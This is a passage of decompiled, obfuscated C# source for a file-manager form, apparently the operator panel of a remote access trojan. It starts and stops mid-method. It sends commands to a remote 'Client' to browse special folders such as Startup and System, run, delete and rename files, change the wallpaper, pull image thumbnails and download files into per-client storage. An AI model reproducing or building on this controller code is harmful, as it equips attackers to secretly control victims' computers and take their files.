              int num = (int) Interaction.MsgBox((object) "Can't Go Back Further", MsgBoxStyle.Exclamation);
            }
            else
            {
              this.vmethod_122().Text = this.vmethod_122().Text.Remove(this.vmethod_122().Text.LastIndexOf("\\", StringComparison.Ordinal), this.vmethod_122().Text.Length - this.vmethod_122().Text.LastIndexOf("\\", StringComparison.Ordinal));
              this.vmethod_122().Text = this.vmethod_122().Text.Remove(this.vmethod_122().Text.LastIndexOf("\\", StringComparison.Ordinal), this.vmethod_122().Text.Length - this.vmethod_122().Text.LastIndexOf("\\", StringComparison.Ordinal));
              this.vmethod_122().Text += "\\";
              this.method_33(this.vmethod_122().Text);
            }
          }
          else
          {
            this.method_33(Conversions.ToString(selectedItem.Tag));
            this.vmethod_122().Text = Conversions.ToString(selectedItem.Tag);
          }
        }
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_4(object sender, EventArgs e) => this.method_34(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.SpecialFolderPacket.ApplicationData);

  private void method_5(object sender, EventArgs e) => this.method_34(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.SpecialFolderPacket.Temp);

  private void method_6(object sender, EventArgs e) => this.method_34(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.SpecialFolderPacket.ProgramFiles);

  private void method_7(object sender, EventArgs e) => this.method_34(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.SpecialFolderPacket.Startup);

  private void method_8(object sender, EventArgs e) => this.method_34(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.SpecialFolderPacket.Windows);

  private void method_9(object sender, EventArgs e) => this.method_34(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.SpecialFolderPacket.System);

  private void method_10(object sender, EventArgs e) => this.method_34(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.SpecialFolderPacket.Recent);

  private void method_11(object sender, EventArgs e) => this.method_34(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.SpecialFolderPacket.StartMenu);

  private void method_12(object sender, EventArgs e) => this.method_34(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.SpecialFolderPacket.Desktop);

  private void method_13(object sender, EventArgs e) => this.method_34(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.SpecialFolderPacket.UserProfile);

  private void method_14(object sender, EventArgs e) => this.method_34(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.SpecialFolderPacket.MyDocuments);

  private void method_15(object sender, EventArgs e) => this.method_34(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.SpecialFolderPacket.MyPictures);

  private void method_16(object sender, EventArgs e) => this.method_34(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.SpecialFolderPacket.MyMusic);

  private void method_17(object sender, EventArgs e)
  {
    if (this.vmethod_92().SelectedItems.Count <= 0)
      return;
    this.method_37(Conversions.ToString(this.vmethod_92().SelectedItems[0].Tag));
  }

  private void method_18(object sender, EventArgs e)
  {
    if (this.vmethod_92().SelectedItems.Count <= 0)
      return;
    this.method_35(Conversions.ToString(this.vmethod_92().SelectedItems[0].Tag));
  }

  private void method_19(object sender, EventArgs e)
  {
    string string_2 = Interaction.InputBox("Please enter a new name for this file/folder", "User input required", string.Empty);
    this.method_39(Conversions.ToString(this.vmethod_92().SelectedItems[0].Tag), string_2);
  }

  private void method_20(object sender, EventArgs e)
  {
    string str = Interaction.InputBox("Please enter a folder name", "User input required", string.Empty);
    this.method_38(this.vmethod_122().Text + str);
  }

  private void method_21(object sender, EventArgs e)
  {
    if (this.vmethod_92().SelectedItems.Count <= 0)
      return;
    this.method_40(Conversions.ToString(this.vmethod_92().SelectedItems[0].Tag));
  }

  private void method_22(object sender, EventArgs e)
  {
    if (Class97.smethod_22(this.gclass18_0.method_20().string_12, "3.8.1"))
    {
      dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[4]
      {
        (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileHeader,
        (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.Thumbnail,
        (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileThumbnailGallery.List,
        (object) this.vmethod_122().Text
      });
    }
    else
    {
      int num = (int) MessageBox.Show("Please update the selected to use this feature.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
    }
  }

  public void method_23(object[] object_0)
  {
    int num = object_0.Length - 1;
    for (int index = 2; index <= num; ++index)
      this.vmethod_122().Items.Add(RuntimeHelpers.GetObjectValue(object_0[index]));
    this.vmethod_122().SelectedIndex = 0;
    this.method_33(this.vmethod_122().Text);
  }

  public void method_24(object[] object_0)
  {
    this.vmethod_92().BeginUpdate();
    this.vmethod_92().Items.Clear();
    if (this.vmethod_122().Text.Length != 3)
      this.method_41();
    int num = object_0.Length - 1;
    for (int index1 = 2; index1 <= num; index1 += 5)
    {
      ListViewItem listViewItem = new ListViewItem();
      listViewItem.Text = Conversions.ToString(object_0[index1]);
      ListViewItem.ListViewSubItemCollection subItems1 = listViewItem.SubItems;
      object[] objArray1 = new object[1];
      object[] objArray2 = objArray1;
      object[] objArray3 = object_0;
      object[] objArray4 = objArray3;
      int index2 = index1 + 1;
      int index3 = index2;
      object objectValue1 = RuntimeHelpers.GetObjectValue(objArray4[index3]);
      objArray2[0] = objectValue1;
      object[] objArray5 = objArray1;
      object[] Arguments1 = objArray5;
      bool[] flagArray1 = new bool[1]{ true };
      bool[] CopyBack1 = flagArray1;
      NewLateBinding.LateCall((object) subItems1, (System.Type) null, "Add", Arguments1, (string[]) null, (System.Type[]) null, CopyBack1, true);
      if (flagArray1[0])
        objArray3[index2] = RuntimeHelpers.GetObjectValue(objArray5[0]);
      ListViewItem.ListViewSubItemCollection subItems2 = listViewItem.SubItems;
      object[] objArray6 = new object[1];
      object[] objArray7 = objArray6;
      object[] objArray8 = object_0;
      object[] objArray9 = objArray8;
      int index4 = index1 + 2;
      int index5 = index4;
      object objectValue2 = RuntimeHelpers.GetObjectValue(objArray9[index5]);
      objArray7[0] = objectValue2;
      object[] objArray10 = objArray6;
      object[] Arguments2 = objArray10;
      bool[] flagArray2 = new bool[1]{ true };
      bool[] CopyBack2 = flagArray2;
      NewLateBinding.LateCall((object) subItems2, (System.Type) null, "Add", Arguments2, (string[]) null, (System.Type[]) null, CopyBack2, true);
      if (flagArray2[0])
        objArray8[index4] = RuntimeHelpers.GetObjectValue(objArray10[0]);
      ListViewItem.ListViewSubItemCollection subItems3 = listViewItem.SubItems;
      object[] objArray11 = new object[1];
      object[] objArray12 = objArray11;
      object[] objArray13 = object_0;
      object[] objArray14 = objArray13;
      int index6 = index1 + 3;
      int index7 = index6;
      object objectValue3 = RuntimeHelpers.GetObjectValue(objArray14[index7]);
      objArray12[0] = objectValue3;
      object[] objArray15 = objArray11;
      object[] Arguments3 = objArray15;
      bool[] flagArray3 = new bool[1]{ true };
      bool[] CopyBack3 = flagArray3;
      NewLateBinding.LateCall((object) subItems3, (System.Type) null, "Add", Arguments3, (string[]) null, (System.Type[]) null, CopyBack3, true);
      if (flagArray3[0])
        objArray13[index6] = RuntimeHelpers.GetObjectValue(objArray15[0]);
      listViewItem.Tag = RuntimeHelpers.GetObjectValue(object_0[index1 + 4]);
      object Left = object_0[index1 + 2];
      if (Operators.ConditionalCompareObjectEqual(Left, (object) "Folder", false))
        listViewItem.ImageIndex = 0;
      else if (Operators.ConditionalCompareObjectEqual(Left, (object) "File", false))
      {
        string extension = Path.GetExtension(Conversions.ToString(object_0[index1]));
        if (!this.vmethod_66().Images.Keys.Contains(extension))
        {
          this.vmethod_66().Images.Add(extension, (Image) this.method_42(extension));
          listViewItem.ImageKey = extension;
        }
        else
          listViewItem.ImageKey = extension;
      }
      this.vmethod_92().Items.Add(listViewItem);
    }
    if (this.string_0 != null)
    {
      try
      {
        foreach (ListViewItem listViewItem in this.vmethod_92().Items)
        {
          if (Operators.ConditionalCompareObjectEqual(listViewItem.Tag, (object) this.string_0, false))
          {
            this.vmethod_92().Items[listViewItem.Index].Selected = true;
            this.string_0 = (string) null;
          }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    this.vmethod_92().EndUpdate();
    if (this.formUploadDialog_0 == null)
      return;
    this.formUploadDialog_0.Close();
  }

  public void method_25(object[] object_0)
  {
    this.method_33(Conversions.ToString(object_0[2]));
    this.vmethod_122().Text = Conversions.ToString(object_0[2]);
  }

  public void method_26(object[] object_0)
  {
    try
    {
      foreach (ListViewItem listViewItem in this.vmethod_92().Items)
      {
        if (Operators.ConditionalCompareObjectEqual(listViewItem.Tag, object_0[2], false))
          this.vmethod_92().Items.Remove(listViewItem);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  public void method_27(object[] object_0) => this.vmethod_92().Items.Add(new ListViewItem()
  {
    Text = Path.GetFileName(Conversions.ToString(object_0[2])),
    Tag = Operators.ConcatenateObject(object_0[2], (object) "\\"),
    ImageIndex = 0,
    SubItems = {
      string.Empty,
      "Folder",
      Conversions.ToString(DateTime.Now)
    }
  });

  public void method_28(object[] object_0)
  {
    try
    {
      foreach (ListViewItem listViewItem in this.vmethod_92().Items)
      {
        if (Operators.CompareString((string) listViewItem.Tag, (string) object_0[2], false) == 0)
          this.vmethod_92().Items[listViewItem.Index].Text = Conversions.ToString(object_0[3]);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  public void method_29(object[] object_0)
  {
    ListViewItem listViewItem = new ListViewItem();
    string str = (string) object_0[2];
    string extension = Path.GetExtension(str);
    if (!this.vmethod_66().Images.Keys.Contains(extension))
    {
      this.vmethod_66().Images.Add(extension, (Image) this.method_42(extension));
      listViewItem.ImageKey = extension;
    }
    else
      listViewItem.ImageKey = extension;
    listViewItem.Text = Path.GetFileName(str);
    listViewItem.SubItems.Add(str);
    this.vmethod_108().Items.Add(listViewItem);
  }

  public void method_30(object[] object_0) => this.vmethod_104().Text = string.Format("Current Directory: {0}", RuntimeHelpers.GetObjectValue(object_0[2]));

  public void method_31(GClass18 gclass18_1, object[] object_0)
  {
    FormFileManager.Class99 class99 = new FormFileManager.Class99();
    class99.object_0 = object_0;
    class99.gclass18_0 = gclass18_1;
    switch ((dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileThumbnailGallery) class99.object_0[2])
    {
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileThumbnailGallery.List:
        this.method_32(class99.gclass18_0, class99.object_0);
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileThumbnailGallery.NextImage:
        class99.gclass18_0.method_20().formFileThumbnail_0.Invoke((Delegate) new Delegate0(class99._Lambda\u0024__61));
        break;
    }
  }

  private void method_32(GClass18 gclass18_1, object[] object_0)
  {
    List<string> list_2 = new List<string>();
    int num = object_0.Length - 1;
    for (int index = 3; index <= num; ++index)
      list_2.Add(Conversions.ToString(object_0[index]));
    if (list_2.Count == 0)
      return;
    this.Invoke((Delegate) new Delegate0(new FormFileManager.Class100()
    {
      formFileThumbnail_0 = new FormFileThumbnail(gclass18_1, list_2)
    }._Lambda\u0024__62));
  }

  private void method_33(string string_1) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[3]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileHeader,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.ListFiles,
    (object) string_1
  });

  private void method_34(
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.SpecialFolderPacket specialFolderPacket_0)
  {
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[3]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileHeader,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.SpecialFolder,
      (object) specialFolderPacket_0
    });
  }

  private void method_35(string string_1) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[3]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileHeader,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.Delete,
    (object) string_1
  });

  private void method_36(string string_1, string string_2) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[4]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileHeader,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.Search,
    (object) string_1,
    (object) string_2
  });

  private void method_37(string string_1) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[3]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileHeader,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.ExecuteFile,
    (object) string_1
  });

  private void method_38(string string_1) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[3]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileHeader,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.CreateFolder,
    (object) string_1
  });

  private void method_39(string string_1, string string_2) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[4]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileHeader,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.Rename,
    (object) string_1,
    (object) string_2
  });

  private void method_40(string string_1) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[3]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileHeader,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.Wallpaper,
    (object) string_1
  });

  public void method_41()
  {
    ListViewItem listViewItem = new ListViewItem("..")
    {
      SubItems = {
        string.Empty
      },
      ImageIndex = 0,
      Tag = (object) '\u0001'
    };
    listViewItem.SubItems.Add("Folder");
    listViewItem.SubItems.Add(string.Empty);
    this.vmethod_92().Items.Add(listViewItem);
  }

  private Bitmap method_42(string string_1)
  {
    string path = Class132.smethod_0().FileSystem.SpecialDirectories.Temp + "\\_Icon Cache";
    if (Operators.CompareString(string_1, string.Empty, false) == 0)
    {
      string string_1_1 = path + "\\_Icon";
      File.WriteAllBytes(path + "\\_Icon", new byte[1]
      {
        (byte) 90
      });
      return this.method_43(string_1_1);
    }
    if (!string_1.StartsWith("."))
      string_1 = "." + string_1;
    if (!Directory.Exists(path))
      Directory.CreateDirectory(path);
    string str = path + "\\_Icon" + string_1;
    File.WriteAllBytes(str, new byte[1]{ (byte) 90 });
    return this.method_45(this.method_43(str));
  }

  [DllImport("shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern IntPtr SHGetFileInfo(
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1,
    int int_0,
    ref FormFileManager.Struct7 struct7_0,
    int int_1,
    int int_2);

  public Bitmap method_43(string string_1)
  {
    FormFileManager.Struct7 struct7_0 = new FormFileManager.Struct7();
    struct7_0.string_0 = new string(char.MinValue, 260);
    struct7_0.string_1 = new string(char.MinValue, 80);
    FormFileManager.SHGetFileInfo(ref string_1, 0, ref struct7_0, Marshal.SizeOf<FormFileManager.Struct7>(struct7_0), 257);
    return Icon.FromHandle(struct7_0.intptr_0).ToBitmap();
  }

  public void method_44()
  {
    Image image = (Image) this.method_45((Bitmap) Class97.smethod_2("Listview", "folder-horizontal"));
    this.vmethod_66().Images.Clear();
    this.vmethod_66().Images.Add(image);
  }

  private Bitmap method_45(Bitmap bitmap_0)
  {
    Bitmap bitmap1;
    try
    {
      Bitmap bitmap2 = new Bitmap(bitmap_0.Width + 4, bitmap_0.Height + 4);
      Graphics graphics = Graphics.FromImage((Image) bitmap2);
      graphics.DrawImage((Image) bitmap_0, 0, 2);
      bitmap_0.Dispose();
      graphics.Dispose();
      bitmap1 = bitmap2;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      bitmap1 = bitmap_0;
      ProjectData.ClearProjectError();
    }
    return bitmap1;
  }

  private void method_46()
  {
    List<ToolStripMenuItem> list_0 = new List<ToolStripMenuItem>();
    try
    {
      foreach (ToolStripItem toolStripMenuItem_27 in (ArrangedElementCollection) this.vmethod_6().Items)
      {
        try
        {
          if (!toolStripMenuItem_27.Tag.ToString().Contains("SEPERATOR"))
            this.method_47((ToolStripMenuItem) toolStripMenuItem_27, ref list_0);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
    try
    {
      foreach (ToolStripMenuItem toolStripMenuItem in list_0)
      {
        try
        {
          if (!toolStripMenuItem.Tag.ToString().Contains("SEPERATOR"))
            toolStripMenuItem.Image = this.method_48(toolStripMenuItem.Text, Application.StartupPath + "\\Resources\\Images\\ContextMenu\\File Manager");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }
    finally
    {
      List<ToolStripMenuItem>.Enumerator enumerator;
      enumerator.Dispose();
    }
  }

  private void method_47(ToolStripMenuItem toolStripMenuItem_27, ref List<ToolStripMenuItem> list_0)
  {
    list_0.Add(toolStripMenuItem_27);
    try
    {
      foreach (ToolStripItem dropDownItem in (ArrangedElementCollection) toolStripMenuItem_27.DropDownItems)
      {
        if (dropDownItem is ToolStripMenuItem)
          this.method_47((ToolStripMenuItem) dropDownItem, ref list_0);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  public Image method_48(string string_1, string string_2)
  {
    string_1 = string_1.Replace(' ', '-').ToLower() + ".png";
    foreach (string file in Directory.GetFiles(string_2))
    {
      if (Operators.CompareString(new FileInfo(file).Name, string_1, false) == 0)
        return Image.FromFile(file);
    }
    return (Image) new Bitmap(16, 16);
  }

  public void method_49(string string_1, string string_2)
  {
    FormFileManager.Class98 class98 = new FormFileManager.Class98();
    class98.formFileManager_0 = this;
    class98.listViewItem_0 = new ListViewItem();
    string extension = Path.GetExtension(string_1);
    if (!this.vmethod_66().Images.Keys.Contains(extension))
    {
      this.vmethod_66().Images.Add(extension, (Image) this.method_42(extension));
      class98.listViewItem_0.ImageKey = extension;
    }
    else
      class98.listViewItem_0.ImageKey = extension;
    class98.listViewItem_0.Text = string_1;
    class98.listViewItem_0.SubItems.Add(string_2);
    class98.listViewItem_0.SubItems.Add("0%");
    class98.listViewItem_0.SubItems.Add("0 b/s");
    class98.listViewItem_0.SubItems.Add("-");
    this.Invoke((Delegate) new Delegate0(class98._Lambda\u0024__63));
  }

  private void method_50(object sender, KeyEventArgs e)
  {
    if (e.KeyCode != Keys.Return)
      return;
    this.method_36(this.vmethod_122().Text, this.vmethod_118().Text);
    this.vmethod_88().SelectedIndex = 1;
  }

  private void method_51(object sender, EventArgs e)
  {
    if (this.vmethod_92().SelectedItems.Count == 0)
      return;
    if (Class97.smethod_22(this.gclass18_0.method_20().string_12, "3.8.1"))
    {
      List<object> objectList = new List<object>();
      objectList.Add((object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileTransfer);
      objectList.Add((object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.TransferHeader.StartDownload);
      try
      {
        foreach (ListViewItem selectedItem in this.vmethod_92().SelectedItems)
        {
          if (selectedItem.ImageIndex != 0)
          {
            objectList.Add(RuntimeHelpers.GetObjectValue(selectedItem.Tag));
            this.bool_0 = true;
          }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      if (!this.bool_0)
        return;
      dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, objectList.ToArray());
      this.vmethod_68().Start();
      this.bool_0 = false;
    }
    else
    {
      int num = (int) MessageBox.Show("Please update the selected Client to the latest version, the File Transfer Protocol has been changed", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
    }
  }

  private void method_52(object sender, EventArgs e)
  {
    if (this.gclass18_0.method_20().listViewItem_5 == null)
      return;
    ListViewItem listViewItem5 = this.gclass18_0.method_20().listViewItem_5;
    listViewItem5.SubItems[3].Text = Class97.gclass21_0.method_60(this.gclass18_0.method_20().long_0) + "/s";
    string str = this.method_53((int) this.gclass18_0.method_20().long_0, this.gclass18_0.method_20().long_1, this.gclass18_0.method_20().long_2);
    if (str != null && !str.Contains("-"))
      listViewItem5.SubItems[4].Text = str;
    this.gclass18_0.method_20().long_0 = 0L;
  }

  public string method_53(int int_0, long long_0, long long_1)
  {
label_0:
    int num1;
    string str1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      TimeSpan timeSpan = new TimeSpan(0, 0, (int) Math.Round((double) (long_1 - long_0) / (double) int_0));
label_2:
      num3 = 3;
      int num4 = (int) Math.Round(timeSpan.TotalHours);
label_3:
      num3 = 4;
      int minutes = timeSpan.Minutes;
label_4:
      num3 = 5;
      if (num4 != 0)
        goto label_12;
label_5:
      num3 = 6;
      if (minutes != 0)
        goto label_7;
label_6:
      num3 = 7;
      str1 = string.Format("{0:00} seconds ", (object) timeSpan.Seconds);
      goto label_29;
label_7:
      num3 = 9;
label_8:
      num3 = 10;
      if (minutes != 1)
        goto label_10;
label_9:
      num3 = 11;
      str1 = string.Format("{0:00} minute and {1:00} seconds ", (object) timeSpan.Minutes, (object) timeSpan.Seconds);
      goto label_29;
label_10:
      num3 = 13;
label_11:
      num3 = 14;
      str1 = string.Format("{0:00} minutes and {1:00} seconds ", (object) timeSpan.Minutes, (object) timeSpan.Seconds);
      goto label_29;
label_12:
      num3 = 18;
label_13:
      num3 = 19;
      if (num4 != 1)
        goto label_18;
label_14:
      num3 = 20;
      if (minutes != 1)
        goto label_16;
label_15:
      num3 = 21;
      str1 = string.Format("{0:00} hour and {1:00} minute", (object) timeSpan.TotalHours, (object) timeSpan.Minutes);
      goto label_29;
label_16:
      num3 = 23;
label_17:
      num3 = 24;
      str1 = string.Format("{0:00} hour and {1:00} minutes", (object) timeSpan.TotalHours, (object) timeSpan.Minutes);
      goto label_29;
label_18:
      num3 = 27;
label_19:
      num3 = 28;
      if (minutes != 1)
        goto label_21;
label_20:
      num3 = 29;
      str1 = string.Format("{0:00} hours and {1:00} minute", (object) timeSpan.TotalHours, (object) timeSpan.Minutes);
      goto label_29;
label_21:
      num3 = 31;
label_22:
      num3 = 32;
      str1 = string.Format("{0:00} hours and {1:00} minutes", (object) timeSpan.TotalHours, (object) timeSpan.Minutes);
      goto label_29;
label_24:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num5 = num2 + 1;
          num2 = 0;
          switch (num5)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            case 7:
              goto label_6;
            case 8:
            case 12:
            case 15:
            case 16:
            case 17:
            case 22:
            case 25:
            case 26:
            case 30:
            case 33:
            case 34:
            case 35:
            case 36:
              goto label_29;
            case 9:
              goto label_7;
            case 10:
              goto label_8;
            case 11:
              goto label_9;
            case 13:
              goto label_10;
            case 14:
              goto label_11;
            case 18:
              goto label_12;
            case 19:
              goto label_13;
            case 20:
              goto label_14;
            case 21:
              goto label_15;
            case 23:
              goto label_16;
            case 24:
              goto label_17;
            case 27:
              goto label_18;
            case 28:
              goto label_19;
            case 29:
              goto label_20;
            case 31:
              goto label_21;
            case 32:
              goto label_22;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_24;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_29:
    string str2 = str1;
    if (num2 == 0)
      return str2;
    ProjectData.ClearProjectError();
    return str2;
  }

  private void method_54(object sender, EventArgs e) => this.method_33(this.vmethod_122().Text);

  private void method_55(object sender, EventArgs e)
  {
    if (this.gclass18_0.method_20().gclass18_3.method_25())
      return;
    this.vmethod_54().Items.Clear();
  }

  private void method_56(object sender, EventArgs e) => Process.Start("explorer.exe", string.Format("/select, {0}", (object) (Application.StartupPath + "\\Saved Data\\Downloads\\" + this.gclass18_0.method_20().method_0() + "\\")));

  private void method_57(object sender, EventArgs e)
  {
    this.gclass18_0.method_20().bool_2 = true;
    if (!this.gclass18_0.method_20().gclass18_3.method_25())
      return;
    this.gclass18_0.method_20().gclass18_3.method_32();
  }

  private void method_58(object sender, EventArgs e)
  {
    if (Class97.smethod_22(this.gclass18_0.method_20().string_12, "3.8.1"))
    {
      List<object> objectList = new List<object>();
      objectList.Add((object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileTransfer);
      objectList.Add((object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.TransferHeader.StartDownload);
      try
      {
        foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
        {
          if (selectedItem.ImageIndex != 0)
            objectList.Add((object) selectedItem.SubItems[1].Text);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, objectList.ToArray());
      this.vmethod_68().Start();
    }
    else
    {
      int num = (int) MessageBox.Show("Please update the selected Client to the latest version, the File Transfer Protocol has been changed", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
    }
  }

  private void method_59(object sender, EventArgs e)
  {
    this.string_0 = this.vmethod_108().SelectedItems[0].SubItems[1].Text;
    string directoryName = new FileInfo(this.vmethod_108().SelectedItems[0].SubItems[1].Text).DirectoryName;
    this.method_33(directoryName);
    this.vmethod_88().SelectedIndex = 0;
    this.vmethod_122().Text = directoryName;
  }

  private void method_60(object sender, LinkLabelLinkClickedEventArgs e) => this.vmethod_88().SelectedIndex = 1;

  private void method_61(object sender, FrameLoadEndEventArgs e) => this.Invoke((Delegate) (() =>
  {
    ((Control) this.vmethod_128()).Dock = DockStyle.Fill;
    this.vmethod_126().Visible = false;
    this.vmethod_88().Visible = true;
    this.vmethod_0().Visible = true;
  }));

  private void method_62(object sender, EventArgs e)
  {
